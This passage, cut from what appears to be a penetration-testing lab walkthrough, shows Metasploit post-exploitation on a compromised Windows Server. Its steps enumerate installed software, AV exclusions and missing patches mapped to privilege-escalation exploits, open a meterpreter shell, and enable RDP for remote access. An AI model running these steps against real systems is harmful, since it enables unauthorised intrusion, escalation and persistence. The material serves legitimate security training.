msf5 post(windows/gather/enum_applications) > set session 1
session => 1
msf5 post(windows/gather/enum_applications) > run

[*] Enumerating applications installed on WIN-OMCNBKR66MN

Installed Applications
======================

 Name                                Version
 ----                                -------
 AWS PV Drivers                      8.3.3
 AWS Tools for Windows               3.15.1084
 Amazon SSM Agent                    2.3.842.0
 Amazon SSM Agent                    2.3.842.0
 EC2ConfigService                    4.9.4222.0
 EC2ConfigService                    4.9.4222.0
 EC2ConfigService                    4.9.4222.0
 Mozilla Firefox 80.0.1 (x86 en-US)  80.0.1
 Mozilla Maintenance Service         80.0.1
 aws-cfn-bootstrap                   1.4.33


[+] Results stored in: /root/.msf4/loot/20230804222006_win_post_10.5.29.148_host.application_122597.txt
[*] Post module execution completed
msf5 post(windows/gather/enum_applications) >
```

We can use the loot command to access the so far enumerated results. As we are already using the postgres it will be sorted and stored in files properly.

```
msf5 post(windows/gather/enum_applications) > loot

Loot
====

host         service  type               name              content     info                    path
----         -------  ----               ----              -------     ----                    ----
10.5.29.148           host.users.active  active_users.txt  text/plain  Active Users            /root/.msf4/loot/20230804221208_win_post_10.5.29.148_host.users.activ_025608.txt
10.5.29.148           host.users.recent  recent_users.txt  text/plain  Recent Users            /root/.msf4/loot/20230804221208_win_post_10.5.29.148_host.users.recen_100163.txt
10.5.29.148           host.applications  applications.txt  text/plain  Installed Applications  /root/.msf4/loot/20230804222006_win_post_10.5.29.148_host.application_122597.txt
```

AV scanning excluded folders

```
msf5 post(windows/gather/enum_applications) > use post/windows/gather/enum_av_excluded 
msf5 post(windows/gather/enum_av_excluded) > options

Module options (post/windows/gather/enum_av_excluded):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   DEFENDER    true             yes       Enumerate exclusions for Microsoft Defender
   ESSENTIALS  true             yes       Enumerate exclusions for Microsoft Security Essentials/Antimalware
   SEP         true             yes       Enumerate exclusions for Symantec Endpoint Protection (SEP)
   SESSION                      yes       The session to run this module on.

msf5 post(windows/gather/enum_av_excluded) > set session 1
session => 1
msf5 post(windows/gather/enum_av_excluded) > run

[*] Enumerating Excluded Paths for AV on WIN-OMCNBKR66MN
[+] Found Windows Defender
[*] No extension exclusions for Windows Defender
[*] No path exclusions for Windows Defender
[*] No process exclusions for Windows Defender
[*] Post module execution completed
msf5 post(windows/gather/enum_av_excluded) > 
```

looking for other computers on network

```
msf5 exploit(windows/http/rejetto_hfs_exec) > use post/windows/gather/enum_computers 
msf5 post(windows/gather/enum_computers) > options

Module options (post/windows/gather/enum_computers):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/enum_computers) > set session 1
session => 1
msf5 post(windows/gather/enum_computers) > run

[*] Running module against WIN-OMCNBKR66MN
[-] This host is not part of a domain.
[*] Post module execution completed
```

```
msf5 post(windows/gather/enum_computers) > search enum_patches

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  post/windows/gather/enum_patches                   normal  No     Windows Gather Applied Patches


msf5 post(windows/gather/enum_computers) > use post/windows/gather/enum_patches
msf5 post(windows/gather/enum_patches) > options

Module options (post/windows/gather/enum_patches):

   Name       Current Setting       Required  Description
   ----       ---------------       --------  -----------
   KB         KB2871997, KB2928120  yes       A comma separated list of KB patches to search for
   MSFLOCALS  true                  yes       Search for missing patches for which there is a MSF local module
   SESSION                          yes       The session to run this module on.

msf5 post(windows/gather/enum_patches) > set session 1
session => 1
msf5 post(windows/gather/enum_patches) > run

[+] KB2871997 is missing
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
[*] Post module execution completed
msf5 post(windows/gather/enum_patches) >
```

manually checking patches

```
msf5 post(windows/gather/enum_patches) > sessions 1
[*] Starting interaction with 1...

meterpreter > shell
Process 1876 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>systeminfo
systeminfo

Host Name:                 WIN-OMCNBKR66MN
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00252-70000-00000-AA535
Original Install Date:     9/10/2020, 9:10:37 AM
System Boot Time:          8/4/2023, 5:21:37 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     1,024 MB
Available Physical Memory: 265 MB
Virtual Memory: Max Size:  9,216 MB
Virtual Memory: Available: 8,072 MB
Virtual Memory: In Use:    1,144 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 208 Hotfix(s) Installed.
                           [01]: KB2894856
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2919442
                           [05]: KB2934520
                           [06]: KB2938066
                           [07]: KB2938772
                           [08]: KB2949621
                           [09]: KB2954879
                           [10]: KB2955164
                           [11]: KB2959626
                           [12]: KB2965500
                           [13]: KB2967917
                           [14]: KB2969339
                           [15]: KB2971203
                           [16]: KB2973448
                           [17]: KB2975061
                           [18]: KB2975719
                           [19]: KB2977765
                           [20]: KB2978041
                           [21]: KB2978126
                           [22]: KB2984006
                           [23]: KB2989647
                           [24]: KB2989930
                           [25]: KB2993100
                           [26]: KB2995004
                           [27]: KB2995388
                           [28]: KB2996799
                           [29]: KB2998174
                           [30]: KB2999226
                           [31]: KB3000483
                           [32]: KB3000850
                           [33]: KB3003057
                           [34]: KB3004545
                           [35]: KB3012199
                           [36]: KB3012702
                           [37]: KB3013172
                           [38]: KB3013769
                           [39]: KB3013791
                           [40]: KB3013816
                           [41]: KB3014442
                           [42]: KB3019978
                           [43]: KB3021910
                           [44]: KB3022345
                           [45]: KB3023222
                           [46]: KB3023266
                           [47]: KB3024751
                           [48]: KB3024755
                           [49]: KB3030947
                           [50]: KB3032663
                           [51]: KB3033446
                           [52]: KB3035126
                           [53]: KB3036612
                           [54]: KB3037579
                           [55]: KB3038002
                           [56]: KB3038701
                           [57]: KB3042085
                           [58]: KB3044374
                           [59]: KB3044673
                           [60]: KB3045634
                           [61]: KB3045685
                           [62]: KB3045717
                           [63]: KB3045719
                           [64]: KB3045755
                           [65]: KB3045999
                           [66]: KB3046017
                           [67]: KB3046737
                           [68]: KB3054169
                           [69]: KB3054203
                           [70]: KB3054256
                           [71]: KB3054464
                           [72]: KB3055323
                           [73]: KB3055343
                           [74]: KB3055642
                           [75]: KB3059317
                           [76]: KB3060681
                           [77]: KB3060793
                           [78]: KB3061512
                           [79]: KB3063843
                           [80]: KB3064209
                           [81]: KB3068708
                           [82]: KB3071756
                           [83]: KB3074228
                           [84]: KB3074548
                           [85]: KB3075853
                           [86]: KB3077715
                           [87]: KB3078405
                           [88]: KB3078676
                           [89]: KB3080149
                           [90]: KB3082089
                           [91]: KB3083325
                           [92]: KB3083711
                           [93]: KB3084135
                           [94]: KB3084905
                           [95]: KB3086255
                           [96]: KB3087137
                           [97]: KB3091297
                           [98]: KB3094486
                           [99]: KB3095701
                           [100]: KB3097997
                           [101]: KB3098779
                           [102]: KB3099834
                           [103]: KB3100473
                           [104]: KB3102429
                           [105]: KB3102467
                           [106]: KB3102812
                           [107]: KB3103616
                           [108]: KB3103696
                           [109]: KB3103709
                           [110]: KB3109103
                           [111]: KB3109976
                           [112]: KB3110329
                           [113]: KB3112148
                           [114]: KB3112336
                           [115]: KB3115224
                           [116]: KB3118401
                           [117]: KB3121261
                           [118]: KB3122654
                           [119]: KB3123245
                           [120]: KB3126434
                           [121]: KB3126587
                           [122]: KB3127226
                           [123]: KB3133043
                           [124]: KB3133690
                           [125]: KB3134179
                           [126]: KB3134815
                           [127]: KB3135449
                           [128]: KB3137728
                           [129]: KB3138602
                           [130]: KB3138615
                           [131]: KB3139164
                           [132]: KB3139398
                           [133]: KB3139914
                           [134]: KB3140219
                           [135]: KB3140234
                           [136]: KB3141092
                           [137]: KB3145384
                           [138]: KB3145432
                           [139]: KB3146604
                           [140]: KB3146723
                           [141]: KB3146751
                           [142]: KB3147071
                           [143]: KB3148851
                           [144]: KB3155784
                           [145]: KB3156059
                           [146]: KB3156418
                           [147]: KB3159398
                           [148]: KB3161949
                           [149]: KB3162343
                           [150]: KB3162835
                           [151]: KB3172614
                           [152]: KB3172729
                           [153]: KB3173424
                           [154]: KB3175024
                           [155]: KB3178539
                           [156]: KB3179574
                           [157]: KB3179948
                           [158]: KB3186539
                           [159]: KB3195387
                           [160]: KB3210135
                           [161]: KB4014510
                           [162]: KB4024847
                           [163]: KB4033369
                           [164]: KB4033428
                           [165]: KB4040972
                           [166]: KB4041777
                           [167]: KB4043763
                           [168]: KB4054566
                           [169]: KB4054854
                           [170]: KB4054980
                           [171]: KB4055001
                           [172]: KB4056898
                           [173]: KB4073700
                           [174]: KB4096417
                           [175]: KB4098972
                           [176]: KB4338419
                           [177]: KB4344145
                           [178]: KB4457015
                           [179]: KB4457034
                           [180]: KB4459941
                           [181]: KB4470639
                           [182]: KB4480054
                           [183]: KB4480095
                           [184]: KB4483450
                           [185]: KB4486105
                           [186]: KB4486545
                           [187]: KB4495585
                           [188]: KB4504418
                           [189]: KB4506993
                           [190]: KB4506996
                           [191]: KB4511524
                           [192]: KB4512938
                           [193]: KB4514361
                           [194]: KB4515846
                           [195]: KB4519567
                           [196]: KB4521864
                           [197]: KB4524445
                           [198]: KB4532940
                           [199]: KB4533004
                           [200]: KB4534134
                           [201]: KB4537482
                           [202]: KB4540725
                           [203]: KB4552933
                           [204]: KB4562253
                           [205]: KB4565635
                           [206]: KB4566425
                           [207]: KB4569753
                           [208]: KB4571703
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.5.16.1
                                 IP address(es)
                                 [01]: 10.5.29.145
                                 [02]: fe80::e80b:7b2a:dbe2:9e07
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Windows\system32>
```

background session again once we get the system info. And look for the enum_shares.

```
msf5 post(windows/gather/enum_patches) > use post/windows/gather/enum_shares 
msf5 post(windows/gather/enum_shares) > options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate Recently entered UNC Paths in the Run Dialog
   RECENT   true             yes       Enumerate Recently mapped shares
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/enum_shares) > set session 1
session => 1
msf5 post(windows/gather/enum_shares) > run

[*] Running against session 1
[*] The following shares were found:
[*] 	Name: print$
[*] 
[*] Post module execution completed
msf5 post(windows/gather/enum_shares) >
```

checking if RDP is enabled if not enabling it.

```
msf5 post(windows/gather/enum_shares) > search rdp

Matching Modules
================

   #    Name                                                           Disclosure Date  Rank       Check  Description
   -    ----                                                           ---------------  ----       -----  -----------
   0    auxiliary/admin/http/wp_custom_contact_forms                   2014-08-07       normal     No     WordPress custom-contact-forms Plugin SQL Upload
   1    auxiliary/admin/http/wp_easycart_privilege_escalation          2015-02-25       normal     Yes    WordPress WP EasyCart Plugin Privilege Escalation
   2    auxiliary/admin/http/wp_gdpr_compliance_privesc                2018-11-08       normal     Yes    WordPress WP GDPR Compliance Plugin Privilege Escalation
   3    auxiliary/admin/http/wp_google_maps_sqli                       2019-04-02       normal     Yes    WordPress Google Maps Plugin SQL Injection
   4    auxiliary/admin/http/wp_symposium_sql_injection                2015-08-18       normal     Yes    WordPress Symposium Plugin SQL Injection
   5    auxiliary/admin/http/wp_wplms_privilege_escalation             2015-02-09       normal     Yes    WordPress WPLMS Theme Privilege Escalation
   6    auxiliary/dos/http/ms15_034_ulonglongadd                                        normal     Yes    MS15-034 HTTP Protocol Stack Request Handling Denial-of-Service
   7    auxiliary/dos/http/wordpress_directory_traversal_dos                            normal     No     WordPress Traversal Directory DoS
   8    auxiliary/dos/http/wordpress_long_password_dos                 2014-11-20       normal     No     WordPress Long Password DoS
   9    auxiliary/dos/http/wordpress_xmlrpc_dos                        2014-08-06       normal     No     Wordpress XMLRPC DoS
   10   auxiliary/dos/windows/rdp/ms12_020_maxchannelids               2012-03-16       normal     No     MS12-020 Microsoft Remote Desktop Use-After-Free DoS
   11   auxiliary/gather/wp_all_in_one_migration_export                2015-03-19       normal     Yes    WordPress All-in-One Migration Export
   12   auxiliary/gather/wp_ultimate_csv_importer_user_extract         2015-02-02       normal     Yes    WordPress Ultimate CSV Importer User Table Extract
   13   auxiliary/gather/wp_w3_total_cache_hash_extract                                 normal     No     WordPress W3-Total-Cache Plugin 0.9.2.4 (or before) Username and Hash Extract
   14   auxiliary/scanner/http/ms15_034_http_sys_memory_dump                            normal     Yes    MS15-034 HTTP Protocol Stack Request Handling HTTP.SYS Memory Information Disclosure
   15   auxiliary/scanner/http/wordpress_content_injection             2017-02-01       normal     Yes    WordPress REST API Content Injection
   16   auxiliary/scanner/http/wordpress_cp_calendar_sqli              2015-03-03       normal     No     WordPress CP Multi-View Calendar Unauthenticated SQL Injection Scanner
   17   auxiliary/scanner/http/wordpress_ghost_scanner                                  normal     No     WordPress XMLRPC GHOST Vulnerability Scanner
   18   auxiliary/scanner/http/wordpress_login_enum                                     normal     No     WordPress Brute Force and User Enumeration Utility
   19   auxiliary/scanner/http/wordpress_multicall_creds                                normal     No     Wordpress XML-RPC system.multicall Credential Collector
   20   auxiliary/scanner/http/wordpress_pingback_access                                normal     No     Wordpress Pingback Locator
   21   auxiliary/scanner/http/wordpress_scanner                                        normal     No     Wordpress Scanner
   22   auxiliary/scanner/http/wordpress_xmlrpc_login                                   normal     No     Wordpress XML-RPC Username/Password Login Scanner
   23   auxiliary/scanner/http/wp_arbitrary_file_deletion              2018-06-26       normal     No     Wordpress Arbitrary File Deletion
   24   auxiliary/scanner/http/wp_contus_video_gallery_sqli            2015-02-24       normal     No     WordPress Contus Video Gallery Unauthenticated SQL Injection Scanner
   25   auxiliary/scanner/http/wp_dukapress_file_read                                   normal     No     WordPress DukaPress Plugin File Read Vulnerability
   26   auxiliary/scanner/http/wp_gimedia_library_file_read                             normal     No     WordPress GI-Media Library Plugin Directory Traversal Vulnerability
   27   auxiliary/scanner/http/wp_mobile_pack_info_disclosure                           normal     No     WordPress Mobile Pack Information Disclosure Vulnerability
   28   auxiliary/scanner/http/wp_mobileedition_file_read                               normal     No     WordPress Mobile Edition File Read Vulnerability
   29   auxiliary/scanner/http/wp_nextgen_galley_file_read                              normal     No     WordPress NextGEN Gallery Directory Read Vulnerability
   30   auxiliary/scanner/http/wp_simple_backup_file_read                               normal     No     WordPress Simple Backup File Read Vulnerability
   31   auxiliary/scanner/http/wp_subscribe_comments_file_read                          normal     No     WordPress Subscribe Comments File Read Vulnerability
   32   auxiliary/scanner/kademlia/server_info                                          normal     No     Gather Kademlia Server Information
   33   auxiliary/scanner/rdp/cve_2019_0708_bluekeep                   2019-05-14       normal     Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   34   auxiliary/scanner/rdp/ms12_020_check                                            normal     Yes    MS12-020 Microsoft Remote Desktop Checker
   35   auxiliary/scanner/rdp/rdp_scanner                                               normal     No     Identify endpoints speaking the Remote Desktop Protocol (RDP)
   36   exploit/freebsd/local/rtld_execl_priv_esc                      2009-11-30       excellent  Yes    FreeBSD rtld execl() Privilege Escalation
   37   exploit/linux/http/tr064_ntpserver_cmdinject                   2016-11-07       normal     Yes    Zyxel/Eir D1000 DSL Modem NewNTPServer Command Injection Over TR-064
   38   exploit/linux/misc/quest_pmmasterd_bof                         2017-04-09       normal     Yes    Quest Privilege Manager pmmasterd Buffer Overflow
   39   exploit/multi/http/wp_crop_rce                                 2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   40   exploit/multi/http/wp_db_backup_rce                            2019-04-24       excellent  Yes    WP Database Backup RCE
   41   exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload  2016-05-04       excellent  Yes    WordPress Ninja Forms Unauthenticated File Upload
   42   exploit/multi/http/wp_responsive_thumbnail_slider_upload       2015-08-28       excellent  Yes    WordPress Responsive Thumbnail Slider Arbitrary File Upload
   43   exploit/multi/php/wp_duplicator_code_inject                    2018-08-29       manual     Yes    Snap Creek Duplicator WordPress plugin code injection
   44   exploit/multi/script/web_delivery                              2013-07-19       manual     No     Script Web Delivery
   45   exploit/multi/vnc/vnc_keyboard_exec                            2015-07-10       great      No     VNC Keyboard Remote Code Execution
   46   exploit/osx/local/rootpipe                                     2015-04-09       great      Yes    Apple OS X Rootpipe Privilege Escalation
   47   exploit/osx/local/rootpipe_entitlements                        2015-07-01       great      Yes    Apple OS X Entitlements Rootpipe Privilege Escalation
   48   exploit/unix/webapp/joomla_akeeba_unserialize                  2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
   49   exploit/unix/webapp/jquery_file_upload                         2018-10-09       excellent  Yes    blueimp's jQuery (Arbitrary) File Upload
   50   exploit/unix/webapp/php_xmlrpc_eval                            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
   51   exploit/unix/webapp/wp_admin_shell_upload                      2015-02-21       excellent  Yes    WordPress Admin Shell Upload
   52   exploit/unix/webapp/wp_advanced_custom_fields_exec             2012-11-14       excellent  Yes    WordPress Plugin Advanced Custom Fields Remote File Inclusion
   53   exploit/unix/webapp/wp_ajax_load_more_file_upload              2015-10-10       excellent  Yes    Wordpress Ajax Load More PHP Upload Vulnerability
   54   exploit/unix/webapp/wp_asset_manager_upload_exec               2012-05-26       excellent  Yes    WordPress Asset-Manager PHP File Upload Vulnerability
   55   exploit/unix/webapp/wp_creativecontactform_file_upload         2014-10-22       excellent  Yes    Wordpress Creative Contact Form Upload Vulnerability
   56   exploit/unix/webapp/wp_downloadmanager_upload                  2014-12-03       excellent  Yes    Wordpress Download Manager (download-manager) Unauthenticated File Upload
   57   exploit/unix/webapp/wp_easycart_unrestricted_file_upload       2015-01-08       excellent  No     WordPress WP EasyCart Unrestricted File Upload
   58   exploit/unix/webapp/wp_foxypress_upload                        2012-06-05       excellent  Yes    WordPress Plugin Foxypress uploadify.php Arbitrary Code Execution
   59   exploit/unix/webapp/wp_frontend_editor_file_upload             2012-07-04       excellent  Yes    Wordpress Front-end Editor File Upload
   60   exploit/unix/webapp/wp_google_document_embedder_exec           2013-01-03       normal     Yes    WordPress Plugin Google Document Embedder Arbitrary File Disclosure
   61   exploit/unix/webapp/wp_holding_pattern_file_upload             2015-02-11       excellent  Yes    WordPress Holding Pattern Theme Arbitrary File Upload
   62   exploit/unix/webapp/wp_inboundio_marketing_file_upload         2015-03-24       excellent  Yes    Wordpress InBoundio Marketing PHP Upload Vulnerability
   63   exploit/unix/webapp/wp_infinitewp_auth_bypass                  2020-01-14       manual     Yes    WordPress InfiniteWP Client Authentication Bypass
   64   exploit/unix/webapp/wp_infusionsoft_upload                     2014-09-25       excellent  Yes    Wordpress InfusionSoft Upload Vulnerability
   65   exploit/unix/webapp/wp_lastpost_exec                           2005-08-09       excellent  No     WordPress cache_lastpostdate Arbitrary Code Execution
   66   exploit/unix/webapp/wp_mobile_detector_upload_execute          2016-05-31       excellent  Yes    WordPress WP Mobile Detector 3.5 Shell Upload
   67   exploit/unix/webapp/wp_nmediawebsite_file_upload               2015-04-12       excellent  Yes    Wordpress N-Media Website Contact Form Upload Vulnerability
   68   exploit/unix/webapp/wp_optimizepress_upload                    2013-11-29       excellent  Yes    WordPress OptimizePress Theme File Upload Vulnerability
   69   exploit/unix/webapp/wp_photo_gallery_unrestricted_file_upload  2014-11-11       excellent  Yes    WordPress Photo Gallery Unrestricted File Upload
   70   exploit/unix/webapp/wp_phpmailer_host_header                   2017-05-03       average    Yes    WordPress PHPMailer Host Header Command Injection
   71   exploit/unix/webapp/wp_pixabay_images_upload                   2015-01-19       excellent  Yes    WordPress Pixabay Images PHP Code Upload
   72   exploit/unix/webapp/wp_plainview_activity_monitor_rce          2018-08-26       excellent  Yes    Wordpress Plainview Activity Monitor RCE
   73   exploit/unix/webapp/wp_platform_exec                           2015-01-21       excellent  No     WordPress Platform Theme File Upload Vulnerability
   74   exploit/unix/webapp/wp_property_upload_exec                    2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   75   exploit/unix/webapp/wp_reflexgallery_file_upload               2012-12-30       excellent  Yes    Wordpress Reflex Gallery Upload Vulnerability
   76   exploit/unix/webapp/wp_revslider_upload_execute                2014-11-26       excellent  Yes    WordPress RevSlider File Upload and Execute Vulnerability
   77   exploit/unix/webapp/wp_slideshowgallery_upload                 2014-08-28       excellent  Yes    Wordpress SlideShow Gallery Authenticated File Upload
   78   exploit/unix/webapp/wp_symposium_shell_upload                  2014-12-11       excellent  Yes    WordPress WP Symposium 14.11 Shell Upload
   79   exploit/unix/webapp/wp_total_cache_exec                        2013-04-17       excellent  Yes    WordPress W3 Total Cache PHP Code Execution
   80   exploit/unix/webapp/wp_worktheflow_upload                      2015-03-14       excellent  Yes    Wordpress Work The Flow Upload Vulnerability
   81   exploit/unix/webapp/wp_wpshop_ecommerce_file_upload            2015-03-09       excellent  Yes    WordPress WPshop eCommerce Arbitrary File Upload Vulnerability
   82   exploit/unix/webapp/wp_wptouch_file_upload                     2014-07-14       excellent  Yes    WordPress WPTouch Authenticated File Upload
   83   exploit/unix/webapp/wp_wysija_newsletters_upload               2014-07-01       excellent  Yes    Wordpress MailPoet Newsletters (wysija-newsletters) Unauthenticated File Upload
   84   exploit/windows/browser/adobe_flashplayer_newfunction          2010-06-04       normal     No     Adobe Flash Player "newfunction" Invalid Pointer Use
   85   exploit/windows/fileformat/adobe_flashplayer_button            2010-10-28       normal     No     Adobe Flash Player "Button" Remote Code Execution
   86   exploit/windows/fileformat/adobe_flashplayer_newfunction       2010-06-04       normal     No     Adobe Flash Player "newfunction" Invalid Pointer Use
   87   exploit/windows/fileformat/cain_abel_4918_rdp                  2008-11-30       good       No     Cain and Abel RDP Buffer Overflow
   88   exploit/windows/fileformat/ms12_005                            2012-01-10       excellent  No     MS12-005 Microsoft Office ClickOnce Unsafe Object Package Handling Vulnerability
   89   exploit/windows/fileformat/winrar_name_spoofing                2009-09-28       excellent  No     WinRAR Filename Spoofing
   90   exploit/windows/fileformat/wireshark_packet_dect               2011-04-18       good       No     Wireshark packet-dect.c Stack Buffer Overflow (local)
   91   exploit/windows/ftp/easyftp_cwd_fixret                         2010-02-16       great      Yes    EasyFTP Server CWD Command Stack Buffer Overflow
   92   exploit/windows/http/sws_connection_bof                        2012-07-20       normal     Yes    Simple Web Server Connection Header Buffer Overflow
   93   exploit/windows/rdp/cve_2019_0708_bluekeep_rce                 2019-05-14       manual     Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
   94   exploit/windows/rdp/rdp_doublepulsar_rce                       2017-04-14       great      Yes    RDP DOUBLEPULSAR Remote Code Execution
   95   post/multi/gather/remmina_creds                                                 normal     No     UNIX Gather Remmina Credentials
   96   post/windows/gather/credentials/mremote                                         normal     No     Windows Gather mRemote Saved Password Extraction
   97   post/windows/gather/credentials/razer_synapse                                   normal     No     Windows Gather Razer Synapse Password Extraction
   98   post/windows/gather/enum_termserv                                               normal     No     Windows Gather Terminal Server Client Connection Information Dumper
   99   post/windows/manage/enable_rdp                                                  normal     No     Windows Manage Enable Remote Desktop
   100  post/windows/manage/sticky_keys                                                 normal     No     Sticky Keys Persistance Module


msf5 post(windows/gather/enum_shares) > use post/windows/manage/enable_rdp
msf5 post(windows/manage/enable_rdp) > options

Module options (post/windows/manage/enable_rdp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   ENABLE    true             no        Enable the RDP Service and Firewall Exception.
   FORWARD   false            no        Forward remote port 3389 to local Port.
   LPORT     3389             no        Local port to forward remote connection.
   PASSWORD                   no        Password for the user created.
   SESSION                    yes       The session to run this module on.
   USERNAME                   no        The username of the user to create.

msf5 post(windows/manage/enable_rdp) > set session 1
session => 1
msf5 post(windows/manage/enable_rdp) > run

[*] Enabling Remote Desktop
[*] 	RDP is already enabled
[*] Setting Terminal Services service startup mode
[*] 	The Terminal Services service is not set to auto, changing it to auto ...
[*] The following Error was encountered: RuntimeError Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20230804231327_default_10.5.29.145_host.windows.cle_710604.txt
[*] Post module execution completed
msf5 post(windows/manage/enable_rdp) >
```